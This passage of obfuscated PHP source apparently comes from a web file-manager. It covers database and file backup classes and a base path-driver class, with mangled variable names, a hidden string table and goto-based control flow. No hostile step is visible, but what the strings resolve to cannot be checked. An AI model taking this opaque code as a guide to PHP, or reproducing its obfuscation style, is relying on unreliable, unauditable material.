$ûíÉé¯»[$¥‡ç•åş[0]][$¥‡ç•åş[1]] = $Ä£·å„¶; break; case 3: $ûíÉé¯»[$¥‡ç•åş[0]][$¥‡ç•åş[1]][$¥‡ç•åş[2]] = $Ä£·å„¶; break; } } Model($îÃ‹Æçü[751])->update($ûíÉé¯»[$îÃ‹Æçü[399]], $ûíÉé¯»); self::$option = $ûíÉé¯»; return self::$option; } public function keep() { $µÈ•¾›¢ =& $_SERVER[ÏéâËõ‘]; $²í«Œˆ = self::get(); if ($²í«Œˆ[$µÈ•¾›¢[293]][$µÈ•¾›¢[759]][$µÈ•¾›¢[752]] == $µÈ•¾›¢[88]) { return; } $this->backupKeep($²í«Œˆ); self::set(array($µÈ•¾›¢[770] => 1)); } private function backupKeep($—¿ĞñÊ©) { $Õï†ÎÛ =& $_SERVER[ÏéâËõ‘]; if (self::$manual == 1) { return; } $Õµ¡·ªŒ = Model($Õï†ÎÛ[751])->listData(); if (empty($Õµ¡·ªŒ)) { return; } $œè“Ğ¸ = 0; $Š¢”ø¢ = array(); foreach ($Õµ¡·ªŒ as $çşèª‰ª) { if ($œè“Ğ¸ >= 7) { break; } $Š¢”ø¢[] = $çşèª‰ª[$Õï†ÎÛ[32]]; $œè“Ğ¸++; } for ($œè“Ğ¸ = 0; $œè“Ğ¸ < 12; $œè“Ğ¸++) { $Š¢”ø¢[] = date($Õï†ÎÛ[771], strtotime("\55{$œè“Ğ¸}\x20\155\x6f\x6e\x74\150\x73")); } $Š¢”ø¢ = array_unique($Š¢”ø¢); $–œß‰ÌŠ = Model($Õï†ÎÛ[772])->get($Õï†ÎÛ[773]); foreach ($Õµ¡·ªŒ as $çşèª‰ª) { if (isset($çşèª‰ª[$Õï†ÎÛ[758]]) && $çşèª‰ª[$Õï†ÎÛ[758]] == $Õï†ÎÛ[88]) { continue; } if (!empty($çşèª‰ª[$Õï†ÎÛ[32]]) && in_array($çşèª‰ª[$Õï†ÎÛ[32]], $Š¢”ø¢)) { continue; } Model($Õï†ÎÛ[751])->remove($çşèª‰ª[$Õï†ÎÛ[399]]); $à—ˆ‡Òİ = $this->backupPath($—¿ĞñÊ©, $–œß‰ÌŠ); IO::remove($à—ˆ‡Òİ, !1); } } private function backupPath($—¸½Ê¼, $Ï…„ùÍ = false) { $¬ÙÃıü› =& $_SERVER[ÏéâËõ‘]; if (!$Ï…„ùÍ) { $Ï…„ùÍ = Model($¬ÙÃıü›[772])->get($¬ÙÃıü›[773]); } $üİŒÈç­ = $—¸½Ê¼[$¬ÙÃıü›[32]]; $ÇÎğìÊÔ = substr(md5($¬ÙÃıü›[774] . $Ï…„ùÍ . $üİŒÈç­), 0, 8); return "\173\x69\157\72{$—¸½Ê¼[$¬ÙÃıü›[754]]}\x7d\57\144\x61\x74\141\142\x61\163\145\57\x62\141\143\153\165\x70\x2f" . $üİŒÈç­ . $¬ÙÃıü›[11] . $ÇÎğìÊÔ; } public function db() { $ƒåä³ =& $_SERVER[ÏéâËõ‘]; $«ùêÌÉ” = self::get(); if ($«ùêÌÉ”[$ƒåä³[293]][$ƒåä³[760]][$ƒåä³[752]] == $ƒåä³[88]) { return !0; } $¡ç„£êå = new BackupDb(); if (!$¡ç„£êå->index()) { return !1; } self::set(array($ƒåä³[775] => 1)); return !0; } public function dbFile() { $…çÃ˜Û› =& $_SERVER[ÏéâËõ‘]; $¶´¯—‘Ş = self::get(); if ($¶´¯—‘Ş[$…çÃ˜Û›[293]][$…çÃ˜Û›[764]][$…çÃ˜Û›[752]] == $…çÃ˜Û›[88]) { return !0; } $Û–Šè­ì = new BackupDbFile(); if (!$Û–Šè­ì->index()) { return !1; } self::set(array($…çÃ˜Û›[776] => 1)); return !0; } public function file() { $ÁÓ‘Õİ =& $_SERVER[ÏéâËõ‘]; $ËË¦´ğ¥ = self::get(); if ($ËË¦´ğ¥[$ÁÓ‘Õİ[293]][$ÁÓ‘Õİ[199]][$ÁÓ‘Õİ[752]] == $ÁÓ‘Õİ[88]) { return !0; } if (!isset($ËË¦´ğ¥[$ÁÓ‘Õİ[757]]) || $ËË¦´ğ¥[$ÁÓ‘Õİ[757]] == $ÁÓ‘Õİ[197]) { $è–ÖÖ™· = new BackupFile(); if (!$è–ÖÖ™·->index()) { return !1; } } self::set(array($ÁÓ‘Õİ[777] => 1, $ÁÓ‘Õİ[752] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $èÂÙßŠØ =& $_SERVER[ÏéâËõ‘]; $¨­Ì ù¬ = Backup::get(); self::$io = $¨­Ì ù¬[$èÂÙßŠØ[754]]; self::$name = $¨­Ì ù¬[$èÂÙßŠØ[32]]; $³°ÊÎ—’ = new DbManage(); $‡´•òü¼ = $³°ÊÎ—’->dbType(); $¾³å”¿Ó = array($èÂÙßŠØ[778] => $‡´•òü¼, $èÂÙßŠØ[779] => time()); Backup::set($¾³å”¿Ó); $»ø©©Òù = $this->tmpFilesPath() . $èÂÙßŠØ[780] . self::$name . $èÂÙßŠØ[8]; del_dir($»ø©©Òù); mk_dir($»ø©©Òù); $ ò”ÃÙí = $ó‰“›ÂŒ = 0; $ëŸé‰¥Ì = new Task($èÂÙßŠØ[781], $èÂÙßŠØ[782], 0, LNG($èÂÙßŠØ[783]) . $èÂÙßŠØ[784] . LNG($èÂÙßŠØ[785])); try { $üàâî„  = $³°ÊÎ—’->db()->getTables(); } catch (Exception $à¡Óıéà) { $ëŸé‰¥Ì->end(); return !1; } $üàâî„  = array_diff($üàâî„ , array($èÂÙßŠØ[786], $èÂÙßŠØ[787])); foreach ($üàâî„  as $ıŒØ÷…) { $ ò”ÃÙí += $³°ÊÎ—’->model($ıŒØ÷…)->count(); } $ëŸé‰¥Ì->task[$èÂÙßŠØ[788]] = $ ò”ÃÙí; $GLOBALS[$èÂÙßŠØ[789]] = self::$name; foreach ($üàâî„  as $ıŒØ÷…) { $ãÇë°ğÉ = $»ø©©Òù . $ıŒØ÷… . $èÂÙßŠØ[790]; $ŠÊ‘’½« = null; if ($ıŒØ÷… == $èÂÙßŠØ[791] && (!isset($¨­Ì ù¬[$èÂÙßŠØ[757]]) || $¨­Ì ù¬[$èÂÙßŠØ[757]] == $èÂÙßŠØ[197])) { $ŠÊ‘’½« = self::$io; } $ó‰“›ÂŒ += $³°ÊÎ—’->sqlFromDb($ıŒØ÷…, $ãÇë°ğÉ, $ëŸé‰¥Ì, $ŠÊ‘’½«); } unset($GLOBALS[$èÂÙßŠØ[789]]); $ëŸé‰¥Ì->end(); if ($ó‰“›ÂŒ > $ ò”ÃÙí) { $ ò”ÃÙí = $ó‰“›ÂŒ; } $¾³å”¿Ó = array($èÂÙßŠØ[778] => $‡´•òü¼, $èÂÙßŠØ[775] => 1, $èÂÙßŠØ[792] => $ ò”ÃÙí, $èÂÙßŠØ[793] => $ó‰“›ÂŒ, $èÂÙßŠØ[794] => time()); Backup::set($¾³å”¿Ó); if ($ ò”ÃÙí - $ó‰“›ÂŒ > 0) { $ÅÍ±ö¬ = $èÂÙßŠØ[795]; if (stristr(I18n::getType(), $èÂÙßŠØ[796])) { $ÅÍ±ö¬ = $èÂÙßŠØ[797]; } write_log(array($ÅÍ±ö¬, $¾³å”¿Ó), $èÂÙßŠØ[782]); return !1; } return !0; } private function tmpFilesPath() { $›»ÑÓ =& $_SERVER[ÏéâËõ‘]; $©½ñ×¯– = TEMP_FILES; if ($GLOBALS[$›»ÑÓ[6]][$›»ÑÓ[89]][$›»ÑÓ[798]]) { $©½ñ×¯– = $GLOBALS[$›»ÑÓ[6]][$›»ÑÓ[89]][$›»ÑÓ[798]]; if (!mk_dir($©½ñ×¯–) || !is_writable($©½ñ×¯–) || !IO::mkfile($©½ñ×¯– . $›»ÑÓ[799])) { $©½ñ×¯– = TEMP_FILES; } } return $©½ñ×¯–; } } class BackupDbFile { public function __construct() { } public function index() { $Æ¶¢ÛÕ =& $_SERVER[ÏéâËõ‘]; $Û˜¶Ñšê = Backup::get(); $õŞÒş‰É = $Û˜¶Ñšê[$Æ¶¢ÛÕ[32]]; $Èæáëšà = $this->tmpFilesPath() . "\x62\141\143\x6b\165\160\x5f{$õŞÒş‰É}\x2f"; $³¥¼ùğú = $this->backupPath($Û˜¶Ñšê); if (!($³¥¼ùğú = IO::mkdir($³¥¼ùğú))) { return !1; } $²õ™¥èò = IO::listPath($Èæáëšà); $øŸ¬—ˆ¹ = isset($²õ™¥èò[$Æ¶¢ÛÕ[83]]) ? $²õ™¥èò[$Æ¶¢ÛÕ[83]] : array(); $Óü®Ëè« = array_sum(array_column($øŸ¬—ˆ¹, $Æ¶¢ÛÕ[76])); if (!$Óü®Ëè«) { return !1; } $Õ•‚¬Ÿ = array($Æ¶¢ÛÕ[800] => $Óü®Ëè«, $Æ¶¢ÛÕ[801] => time()); Backup::set($Õ•‚¬Ÿ); $í’“ÃÔÂ = new TaskFileTransfer($Æ¶¢ÛÕ[802], $Æ¶¢ÛÕ[782], count($øŸ¬—ˆ¹), LNG($Æ¶¢ÛÕ[783]) . $Æ¶¢ÛÕ[386] . LNG($Æ¶¢ÛÕ[785]) . $Æ¶¢ÛÕ[803]); $í’“ÃÔÂ->task[$Æ¶¢ÛÕ[765]] = $Óü®Ëè«; foreach ($²õ™¥èò[$Æ¶¢ÛÕ[83]] as $Ø¤‡Éè) { $£Îªå„€ = IO::move($Ø¤‡Éè[$Æ¶¢ÛÕ[84]], $³¥¼ùğú); if (!$£Îªå„€) { $í’“ÃÔÂ->end(); $ó×ÖÛô˜ = IO::getLastError($Æ¶¢ÛÕ[804] . $Ø¤‡Éè[$Æ¶¢ÛÕ[84]] . $Æ¶¢ÛÕ[805] . $³¥¼ùğú . $Æ¶¢ÛÕ[164]); write_log($ó×ÖÛô˜, $Æ¶¢ÛÕ[782]); return !1; } } $ªòˆÂ¡ = new DbManage(); $‹ôõÕÅ– = $ªòˆÂ¡->getSqlFile(); if (!$‹ôõÕÅ–[$Æ¶¢ÛÕ[806]] || !$‹ôõÕÅ–[$Æ¶¢ÛÕ[13]]) { return !1; } IO::move($‹ôõÕÅ–[$Æ¶¢ÛÕ[806]], $³¥¼ùğú); IO::move($‹ôõÕÅ–[$Æ¶¢ÛÕ[13]], $³¥¼ùğú); $í’“ÃÔÂ->end(); $Õ•‚¬Ÿ = array($Æ¶¢ÛÕ[807] => $Óü®Ëè«, $Æ¶¢ÛÕ[808] => time()); Backup::set($Õ•‚¬Ÿ); return !0; } private function backupPath($íûë³•) { $ÇÄÌıö =& $_SERVER[ÏéâËõ‘]; $ğåø‡Ÿõ = $íûë³•[$ÇÄÌıö[32]]; $Šó‘ıç‘ = Model($ÇÄÌıö[772])->get($ÇÄÌıö[773]); $”æã‹Äô = substr(md5($ÇÄÌıö[774] . $Šó‘ıç‘ . $ğåø‡Ÿõ), 0, 8); return "\x7b\x69\157\72{$íûë³•[$ÇÄÌıö[754]]}\175\x2f\144\141\x74\x61\142\x61\163\145\x2f\x62\x61\x63\x6b\x75\160\57" . $ğåø‡Ÿõ . $ÇÄÌıö[11] . $”æã‹Äô; } private function tmpFilesPath() { $ï±­ôÛ¬ =& $_SERVER[ÏéâËõ‘]; $ƒí‹Å”¼ = TEMP_FILES; if ($GLOBALS[$ï±­ôÛ¬[6]][$ï±­ôÛ¬[89]][$ï±­ôÛ¬[798]]) { $ƒí‹Å”¼ = $GLOBALS[$ï±­ôÛ¬[6]][$ï±­ôÛ¬[89]][$ï±­ôÛ¬[798]]; if (!mk_dir($ƒí‹Å”¼) || !is_writable($ƒí‹Å”¼) || !IO::mkfile($ƒí‹Å”¼ . $ï±­ôÛ¬[799])) { $ƒí‹Å”¼ = TEMP_FILES; } } return $ƒí‹Å”¼; } } goto Fà›œ¬Ÿİï; eÅà›áŞŒµ: define($_SERVER[ÏéâËõ‘][241], 1); define($_SERVER[ÏéâËõ‘][242], 0); define($_SERVER[ÏéâËõ‘][243], 2); goto f²ã ¦¬Ú; A™™Æ¥…®: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $€”­‘ìÎ =& $_SERVER[ÏéâËõ‘]; $this->objectDriver = array($€”­‘ìÎ[60], $€”­‘ìÎ[61], $€”­‘ìÎ[62], $€”­‘ìÎ[63], $€”­‘ìÎ[64], $€”­‘ìÎ[65], $€”­‘ìÎ[66], $€”­‘ìÎ[67], $€”­‘ìÎ[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¼ĞÇè£—) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¼ĞÇè£—, $_SERVER[ÏéâËõ‘][8]); } return $¼ĞÇè£—; } public function iconvApp($ğßÎˆŠ) { return $ğßÎˆŠ; } public function iconvSystem($ã…ÇßØ) { return $ã…ÇßØ; } public function iconvTo($£âÊñˆ¿, $…ùŸ†Æç, $‚ÓÏĞ›) { $½ª¤ß =& $_SERVER[ÏéâËõ‘]; if (!$£âÊñˆ¿ || !function_exists($½ª¤ß[69])) { return $£âÊñˆ¿; } static $—Ùª¼ïâ = array(); $• “ªğ = $…ùŸ†Æç . $½ª¤ß[70] . $‚ÓÏĞ› . $½ª¤ß[71] . $£âÊñˆ¿; if (isset($—Ùª¼ïâ[$• “ªğ])) { return $—Ùª¼ïâ[$• “ªğ]; } if (function_exists($½ª¤ß[72])) { $•®İæÙé = @mb_convert_encoding($£âÊñˆ¿, $‚ÓÏĞ›, $…ùŸ†Æç); } else { $•®İæÙé = @iconv($…ùŸ†Æç, $‚ÓÏĞ›, $£âÊñˆ¿); } $•®İæÙé = $•®İæÙé ? $•®İæÙé : $£âÊñˆ¿; if (strstr($•®İæÙé, $½ª¤ß[73])) { $•®İæÙé = str_replace($½ª¤ß[73], $½ª¤ß[11], $•®İæÙé); } $—Ùª¼ïâ[$…ùŸ†Æç . $½ª¤ß[70] . $‚ÓÏĞ› . $½ª¤ß[71] . $£âÊñˆ¿] = $•®İæÙé; $—Ùª¼ïâ[$‚ÓÏĞ› . $½ª¤ß[70] . $…ùŸ†Æç . $½ª¤ß[71] . $£âÊñˆ¿] = $£âÊñˆ¿; $—Ùª¼ïâ[$‚ÓÏĞ› . $½ª¤ß[70] . $…ùŸ†Æç . $½ª¤ß[71] . $•®İæÙé] = $£âÊñˆ¿; $—Ùª¼ïâ[$…ùŸ†Æç . $½ª¤ß[70] . $‚ÓÏĞ› . $½ª¤ß[71] . $•®İæÙé] = $•®İæÙé; return $•®İæÙé; } public function getPathInner($üÓ­½¼») { $ÁğÜ’Ÿå = IO::init($üÓ­½¼»); return $ÁğÜ’Ÿå->path; } public function getPathOuter($ø¼ËÂÂ) { $–¤«Ã© =& $_SERVER[ÏéâËõ‘]; $á±ŠƒÏ  = strlen(trim($this->pathBase, $–¤«Ã©[8])); $ø¼ËÂÂ = substr(trim($ø¼ËÂÂ, $–¤«Ã©[8]), $á±ŠƒÏ ); return $this->pathDriver . $–¤«Ã©[8] . ltrim($ø¼ËÂÂ, $–¤«Ã©[8]); } public function isParentOf($¸¶Æ”®Ó, $Õ÷í‹Áõ) { $ëûîØÚ =& $_SERVER[ÏéâËõ‘]; $¸¶Æ”®Ó = rtrim(strtolower($¸¶Æ”®Ó), $ëûîØÚ[8]) . $ëûîØÚ[8]; $Õ÷í‹Áõ = rtrim(strtolower($Õ÷í‹Áõ), $ëûîØÚ[8]) . $ëûîØÚ[8]; $¡†êè‘ = strpos($Õ÷í‹Áõ, $¸¶Æ”®Ó) === 0; return $¡†êè‘; } public function getType() { $²›Á¦İÆ =& $_SERVER[ÏéâËõ‘]; $”Àï·ú = str_replace($²›Á¦İÆ[74], $²›Á¦İÆ[12], get_class($this)); return strtolower($”Àï·ú); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ƒ”ê‰ûÃ, $¨ ¹ÁÄç) { $¬ï©ÖÆ =& $_SERVER[ÏéâËõ‘]; $ôÁïØ = rtrim($ƒ”ê‰ûÃ, $¬ï©ÖÆ[8]) . $¬ï©ÖÆ[8] . $¨ ¹ÁÄç; $İ‹Ø¦¹Á = $this->exist($ôÁïØ); return $İ‹Ø¦¹Á ? $ôÁïØ : !1; } public function setModifyTime($­˜Ş˜­ú, $Ã¡Ò¦Á‹ = '') { } public function renameObject($Â¾‘¨á±, $Ï¥×¹™) { $ øÀ¥ ¬ = $Ï¥×¹™; $Â¾‘¨á± = $this->getPathOuter($Â¾‘¨á±); $Ï¥×¹™ = $this->pathFather($Â¾‘¨á±) . $Ï¥×¹™; $Í‘²Â‡ô = IO::copy($Â¾‘¨á±, $this->pathFather($Â¾‘¨á±), REPEAT_RENAME_FOLDER, $ øÀ¥ ¬); if ($Í‘²Â‡ô) { IO::remove($Â¾‘¨á±); } return $Í‘²Â‡ô ? $Ï¥×¹™ : !1; } public function tempFile($°ßÎ½îÑ = '', $ƒÂ¦Îé˜ = '') { if (!$°ßÎ½îÑ) { $°ßÎ½îÑ = rand_string(15); } $ÊîÍÛ¡ = TEMP_FILES . rand_string(15) . $_SERVER[ÏéâËõ‘][8]; @mkdir($ÊîÍÛ¡, DEFAULT_PERRMISSIONS, !0); $ôÂ¦—ÃØ = $ÊîÍÛ¡ . $°ßÎ½îÑ; @touch($ôÂ¦—ÃØ); if ($ƒÂ¦Îé˜) { file_put_contents($ôÂ¦—ÃØ, $ƒÂ¦Îé˜); } return $ôÂ¦—ÃØ; } public function tempFileRemve($Œ€Á¨ˆ) { @unlink($Œ€Á¨ˆ); @rmdir($this->pathFather($Œ€Á¨ˆ)); } public function mkfile($±à•ËÁƒ, $í‚Ã€ÁÚ = '', $–è„¨½ = REPEAT_RENAME) { } public function mkdir($³ïì•€ô, $›÷·Ú¥İ = REPEAT_SKIP) { } public function delFile($Çí‚×Ö¤) { } public function delFolder($†º‡ Éº) { } public function copyFile($­¡şšÛÂ, $ŠÀèØŒè) { } public function moveFile($Ÿ²ë³š², $²ì©Êƒ) { } public function remove($ô›†) { if ($this->isFile($ô›†)) { return $this->delFile($ô›†); } return $this->delFolder($ô›†); } public function rename($í¶Óƒ¢Õ, $Ò´Ì¶Ëõ) { } public function exist($ÅØ«ĞíÈ) { } public function findByHash($ıö‚Û = '', $«¶ƒìØ = '') { return !1; } public function isFile($Âñ£—Ç) { } public function isFolder($»ˆ„ßòä) { } public function size($¾¸íİŒ¼) { } public function info($±Ü—Í) { } public function infoSimple($ä‘ï‘ÔÇ) { return $this->info($ä‘ï‘ÔÇ); } public function infoAuth($°ÓêÖáù) { return $this->info($°ÓêÖáù); } public function infoFull($Õ¢äÈå€) { return $this->info($Õ¢äÈå€); } public function infoWithChildren($¯¹ŸÀéœ) { $ÈíÄ¿€Ä =& $_SERVER[ÏéâËõ‘]; static $Š¡Ç–É­ = array(); if (isset($Š¡Ç–É­[$¯¹ŸÀéœ])) { return $Š¡Ç–É­[$¯¹ŸÀéœ]; } $ˆ©âµ´Š = $this->info($¯¹ŸÀéœ); if ($ˆ©âµ´Š && $ˆ©âµ´Š[$ÈíÄ¿€Ä[33]] == $ÈíÄ¿€Ä[75]) { $øÎ›¢†ñ = array($ÈíÄ¿€Ä[76] => 0, $ÈíÄ¿€Ä[77] => 0, $ÈíÄ¿€Ä[78] => 0); $this->infoChildren($¯¹ŸÀéœ, $øÎ›¢†ñ); $ˆ©âµ´Š[$ÈíÄ¿€Ä[76]] = $øÎ›¢†ñ[$ÈíÄ¿€Ä[76]]; $ˆ©âµ´Š[$ÈíÄ¿€Ä[79]] = array($ÈíÄ¿€Ä[80] => $øÎ›¢†ñ[$ÈíÄ¿€Ä[77]], $ÈíÄ¿€Ä[81] => $øÎ›¢†ñ[$ÈíÄ¿€Ä[78]]); $Š¡Ç–É­[$¯¹ŸÀéœ] = $ˆ©âµ´Š; } return $ˆ©âµ´Š; } public function listPath($¹Õ­·Ù, $éêäïèì = false) { } public function has($ŒÒ„Š, $À©¹›¸× = false, $Ì˜ëèÓ = false) { } public function canRead($êŞ£Ã¼) { } public function canWrite($™óÔ³†¼) { } public function getContent($õËä¬à) { } public function setContent($¡ç™ˆŸ‘, $ë¼ò¥Å = '') { } protected function infoChildren($¢¿ºº“‚, &$üÁõˆó¨) { $íÌìÊ =& $_SERVER[ÏéâËõ‘]; check_abort_echo(); $î™ç³½ = $this->listPath($¢¿ºº“‚, !0); $î™ç³½ = array_merge($î™ç³½[$íÌìÊ[82]], $î™ç³½[$íÌìÊ[83]]); foreach ($î™ç³½ as $±• ‰§Ç) { if ($±• ‰§Ç[$íÌìÊ[33]] == $íÌìÊ[75]) { $üÁõˆó¨[$íÌìÊ[78]]++; $àÜÇÀ‘ = $this->getPathInner($±• ‰§Ç[$íÌìÊ[84]]); $this->infoChildren($àÜÇÀ‘, $üÁõˆó¨); } else { $üÁõˆó¨[$íÌìÊ[77]]++; $üÁõˆó¨[$íÌìÊ[76]] += $±• ‰§Ç[$íÌìÊ[76]]; } } } public function fileSubstr($³İøô‘Á, $§ ², $±Õ„«÷½) { } public function listAll($“ëøŒşğ) { } public function listAllMake($áôÆÊæØ, &$ê€ÜÉ¬) { $ÆÜÕÒ£í =& $_SERVER[ÏéâËõ‘]; check_abort_echo(); $©å¦Ø‘˜ = $this->listPath($áôÆÊæØ, !0); if (!$©å¦Ø‘˜) { return; } $ğªóïƒé = array_merge($©å¦Ø‘˜[$ÆÜÕÒ£í[82]], $©å¦Ø‘˜[$ÆÜÕÒ£í[83]]); foreach ($ğªóïƒé as $‡Æ¬Éø“) { $Ù ê…‘Ş = $‡Æ¬Éø“[$ÆÜÕÒ£í[33]] == $ÆÜÕÒ£í[75]; $Åï¥‡˜µ = array($ÆÜÕÒ£í[84] => $‡Æ¬Éø“[$ÆÜÕÒ£í[84]], $ÆÜÕÒ£í[75] => $Ù ê…‘Ş); if (isset($‡Æ¬Éø“[$ÆÜÕÒ£í[76]])) { $Åï¥‡˜µ[$ÆÜÕÒ£í[76]] = $‡Æ¬Éø“[$ÆÜÕÒ£í[76]]; } if (isset($‡Æ¬Éø“[$ÆÜÕÒ£í[85]])) { $Åï¥‡˜µ[$ÆÜÕÒ£í[85]] = $‡Æ¬Éø“[$ÆÜÕÒ£í[85]]; } if (!$Ù ê…‘Ş) { $ê€ÜÉ¬[] = $Åï¥‡˜µ; continue; } $ê€ÜÉ¬[] = $Åï¥‡˜µ; $Á‡ÆÊ´İ = $‡Æ¬Éø“[$ÆÜÕÒ£í[84]]; $ÃÛÔÛ­Ù = $this->pathDriver; if (substr($‡Æ¬Éø“[$ÆÜÕÒ£í[84]], 0, strlen($ÃÛÔÛ­Ù)) == $ÃÛÔÛ­Ù) { $Á‡ÆÊ´İ = substr($Á‡ÆÊ´İ, strlen($ÃÛÔÛ­Ù)); } $this->listAllMake($Á‡ÆÊ´İ, $ê€ÜÉ¬); } } public function listAllSimple($³”òÉşÉ) { $¹¾˜ùÈç =& $_SERVER[ÏéâËõ‘]; $˜—˜±Ú = array(); $Åª—Í = $this->listAll($³”òÉşÉ); $¡¾–—†è = $this->getPathOuter($³”òÉşÉ); foreach ($Åª—Í as $Ù°ãá±) { $†÷ÌÚÎÑ = $Ù°ãá±[$¹¾˜ùÈç[84]]; $•ÉƒºÑŸ = $Ù°ãá±[$¹¾˜ùÈç[84]]; if (isset($Ù°ãá±[$¹¾˜ùÈç[86]])) { $†÷ÌÚÎÑ = $Ù°ãá±[$¹¾˜ùÈç[86]][$¹¾˜ùÈç[84]]; $Ù°ãá±[$¹¾˜ùÈç[76]] = $Ù°ãá±[$¹¾˜ùÈç[86]][$¹¾˜ùÈç[76]]; $Ù°ãá±[$¹¾˜ùÈç[85]] = $Ù°ãá±[$¹¾˜ùÈç[86]][$¹¾˜ùÈç[85]]; } else { $•ÉƒºÑŸ = substr($Ù°ãá±[$¹¾˜ùÈç[84]], strlen(get_path_father($¡¾–—†è))); $•ÉƒºÑŸ = $¹¾˜ùÈç[8] . ltrim($•ÉƒºÑŸ, $¹¾˜ùÈç[8]); } $ÃÚ‚Ë«™ = array($¹¾˜ùÈç[84] => $•ÉƒºÑŸ, $¹¾˜ùÈç[75] => $Ù°ãá±[$¹¾˜ùÈç[75]]); if (isset($Ù°ãá±[$¹¾˜ùÈç[76]]) && !$Ù°ãá±[$¹¾˜ùÈç[75]]) { $ÃÚ‚Ë«™[$¹¾˜ùÈç[76]] = $Ù°ãá±[$¹¾˜ùÈç[76]]; } if (isset($Ù°ãá±[$¹¾˜ùÈç[85]])) { $ÃÚ‚Ë«™[$¹¾˜ùÈç[85]] = $Ù°ãá±[$¹¾˜ùÈç[85]]; } if (!$Ù°ãá±[$¹¾˜ùÈç[75]]) { $ÃÚ‚Ë«™[$¹¾˜ùÈç[87]] = $†÷ÌÚÎÑ; } $˜—˜±Ú[] = $ÃÚ‚Ë«™; } return $˜—˜±Ú; } public function upload($È–âÙ“æ, $í®àª°, $ò¯³°†Ï = false, $æá“ô„ = REPEAT_REPLACE) { } public function uploadFileByID($€êª›âø, $÷öîÁŒı, $‰úÇœÛ¬) { } public function uploadFileByPath($Ô§éú¶, $êƒ§Çéû, $ŠŒàÈÁî = array()) { } public function isUploadServer() { $Íï‹Ğ¼ú =& $_SERVER[ÏéâËõ‘]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Íï‹Ğ¼ú[88]) { return !0; } return $GLOBALS[$Íï‹Ğ¼ú[6]][$Íï‹Ğ¼ú[89]][$Íï‹Ğ¼ú[90]]; } public function isFileOutServer() { $ëôÄÍÁõ =& $_SERVER[ÏéâËõ‘]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ëôÄÍÁõ[88]) { return !0; } return $GLOBALS[$ëôÄÍÁõ[6]][$ëôÄÍÁõ[89]][$ëôÄÍÁõ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ş€‹Å¯Ü) { $¯§Á†ö‡ =& $_SERVER[ÏéâËõ‘]; if (!$this->isCdnHost()) { return $ş€‹Å¯Ü; } return str_replace(trim(get_url_root($ş€‹Å¯Ü), $¯§Á†ö‡[8]), trim($this->cdnHost, $¯§Á†ö‡[8]), $ş€‹Å¯Ü); } public function uploadLink($ñÂ¶ÕÓ, $à§İüÚ = 0) { $áÃ”š§Ê =& $_SERVER[ÏéâËõ‘]; if ($this->isUploadServer()) { return; } $û¸çÎ« = $this->getType(); if (!in_array($û¸çÎ«, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ßùü‡³Ü = 1024 * 1024 * 10; $İı“êé = $à§İüÚ <= $ßùü‡³Ü ? $áÃ”š§Ê[92] : $áÃ”š§Ê[93]; $èÀ‹¬µ = (!$à§İüÚ ? 1 : ceil($à§İüÚ / pow(1024, 3))) * 3600 * 4; $î³¼”ù = $this->{$İı“êé}($ñÂ¶ÕÓ, $èÀ‹¬µ); if ($î³¼”ù) { $î³¼”ù[$áÃ”š§Ê[94]] = $ñÂ¶ÕÓ; $î³¼”ù[$áÃ”š§Ê[95]] = $û¸çÎ«; } return $î³¼”ù; } public function uploadFormData($‚Ò…•öı, $úÑİô÷¹ = 3600) { } public function multiUploadFormData($ú©ôˆÉé, $êÖÃ—°Î = 3600) { } public function download($ö¦ÁºŸƒ, $‚ºÕ„Ô¤) { } public function ext($´ñĞúúì) { $µõºíş =& $_SERVER[ÏéâËõ‘]; if (strpos($´ñĞúúì, $µõºíş[8]) === -1) { $Ó‰Ì Ô = $´ñĞúúì; } else { $Ó‰Ì Ô = $this->pathThis($´ñĞúúì); } $ßÇ·â¾… = $µõºíş[12]; if (strstr($Ó‰Ì Ô, $µõºíş[10])) { $ßÇ·â¾… = substr($Ó‰Ì Ô, strrpos($Ó‰Ì Ô, $µõºíş[10]) + 1); $ßÇ·â¾… = strtolower($ßÇ·â¾…); } if (strlen($ßÇ·â¾…) > 3 && preg_match($µõºíş[96], $ßÇ·â¾…, $‹´˜ÑÃ)) { $ßÇ·â¾… = $µõºíş[12]; } return $ßÇ·â¾…; } public function pathThis($¸óõ³É—) { $œÏÇËÏ‡ =& $_SERVER[ÏéâËõ‘]; $¸óõ³É— = str_replace($œÏÇËÏ‡[97], $œÏÇËÏ‡[8], rtrim($¸óõ³É—, $œÏÇËÏ‡[8])); $ÂøÈÙƒ‹ = strrpos($¸óõ³É—, $œÏÇËÏ‡[8]); if ($ÂøÈÙƒ‹ === !1) { return $¸óõ³É—; } return substr($¸óõ³É—, $ÂøÈÙƒ‹ + 1); } public function pathFather($¯ğç•Ñ) { $¨ïú•ùÔ =& $_SERVER[ÏéâËõ‘]; $¯ğç•Ñ = str_replace($¨ïú•ùÔ[97], $¨ïú•ùÔ[8], rtrim($¯ğç•Ñ, $¨ïú•ùÔ[8])); $­…ô‰ = strrpos($¯ğç•Ñ, $¨ïú•ùÔ[8]); if ($­…ô‰ === !1) { return $¨ïú•ùÔ[12]; } return substr($¯ğç•Ñ, 0, $­…ô‰ + 1); } public function hashSimple($€é°Ç§) { $ğĞÓÅ÷Š =& $_SERVER[ÏéâËõ‘]; if (!$€é°Ç§) { return md5($ğĞÓÅ÷Š[12]); } $«¢ó«áê = $this->size($€é°Ç§); $‘éıõê– = 200; $—ïåíÀ“ = 50; if ($«¢ó«áê <= $‘éıõê– * $—ïåíÀ“) { return $this->hashMd5($€é°Ç§) . $«¢ó«áê; } $ı¨à‚Ğ² = intval($«¢ó«áê / $—ïåíÀ“); $¾ÖŞ¯ƒÒ = $ğĞÓÅ÷Š[12]; for ($Øİ£ÀÙ = 0; $Øİ£ÀÙ < $—ïåíÀ“; $Øİ£ÀÙ++) { $¾ÖŞ¯ƒÒ .= $this->fileSubstr($€é°Ç§, $ı¨à‚Ğ² * $Øİ£ÀÙ, $‘éıõê–); } 